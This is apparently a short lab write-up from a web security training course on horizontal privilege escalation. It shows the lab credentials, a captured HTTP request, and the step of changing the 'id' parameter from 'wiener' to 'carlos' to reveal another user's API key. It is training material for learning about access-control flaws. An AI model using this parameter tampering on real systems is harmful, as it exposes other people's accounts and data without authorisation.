---
tags:
  - authz
---
# User ID controlled by request parameter

## Instructions

This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

After logging in with the credentials provided we're directed to the my-account page with the following request. Note the `id` parameter.

```text title="Initial request" hl_lines="1"
GET /my-account?id=wiener HTTP/1.1
Host: 0a6b00d40496130b81167f58007a00e5.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a6b00d40496130b81167f58007a00e5.web-security-academy.net/login
Connection: keep-alive
Cookie: session=CbpTgQZBvWdK3HSu5NxzkkCBRCkiThgZ
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: orange
Priority: u=0, i


```

To solve this lab, send this request to repeater, change the value of the `id` parameter from `wiener` to `carlos`. 

Note that we get a 200 status code and Carlos' API key is disclosed. 

![](attachments/authz-lab-5/file-20251121082955788.png)

